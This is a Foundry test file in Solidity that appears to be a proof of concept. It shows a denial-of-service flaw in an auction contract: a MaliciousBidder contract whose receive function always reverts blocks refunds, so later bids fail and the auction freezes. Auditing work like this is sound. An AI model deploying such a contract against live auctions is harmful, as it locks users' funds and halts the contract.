// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract MaliciousBidder {
    function bid(DosAuction auction) public payable {
        auction.bid{value: msg.value}();
    }
    
    receive() external payable {
        revert("Malicious receive function");
    }
}

contract DosAuctionTest is Test {
    DosAuction auction;
    MaliciousBidder malicious;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public {
        auction = new DosAuction();
        malicious = new MaliciousBidder();
        
        // Start auction with 1 hour duration
        auction.startAuction(3600);
        
        // Seed accounts with ETH
        vm.deal(address(malicious), 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_DosWhenRefundFails() public {
        // Malicious user places a successful bid
        vm.prank(address(malicious));
        auction.bid{value: 1 ether}();

        // Verify malicious user is current frontrunner
        assertEq(auction.currentFrontrunner(), address(malicious));
        assertEq(auction.currentBid(), 1 ether);

        // Capture state BEFORE Alice's bid attempt
        console.log("--- BEFORE Alice's Bid ---");
        address preFrontrunner = auction.currentFrontrunner();
        uint256 preBid = auction.currentBid();
        uint256 preTotalBids = auction.totalBids();
        
        console.log("Frontrunner:", preFrontrunner);
        console.log("Current Bid:", preBid);
        console.log("Total Bids:", preTotalBids);

        // Alice attempts to place a higher bid (should trigger refund to malicious user)
        console.log("--- TRIGGER: Alice attempts bid ---");
        vm.prank(alice);
        vm.expectRevert();
        auction.bid{value: 2 ether}();  // Should revert due to failed refund

        // Capture state AFTER Alice's bid attempt
        console.log("--- AFTER Alice's Bid ---");
        address postFrontrunner = auction.currentFrontrunner();
        uint256 postBid = auction.currentBid();
        uint256 postTotalBids = auction.totalBids();
        
        console.log("Frontrunner:", postFrontrunner);
        console.log("Current Bid:", postBid);
        console.log("Total Bids:", postTotalBids);

        // Compare state changes
        bool frontrunnerUnchanged = (preFrontrunner == postFrontrunner);
        bool bidAmountUnchanged = (preBid == postBid);
        bool totalBidsUnchanged = (preTotalBids == postTotalBids);
        
        // All state variables unchanged confirms DoS
        if (frontrunnerUnchanged && bidAmountUnchanged && totalBidsUnchanged) {
            console.log("VERDICT: Vulnerability Exists - Auction state frozen after failed bid");
        } else {
            console.log("VERDICT: Vulnerability not Exist - Auction state changed unexpectedly");
        }

        // Bob cannot place bid either - auction is DoS-ed (original verification remains)
        vm.prank(bob);
        vm.expectRevert();
        auction.bid{value: 3 ether}();
    }
}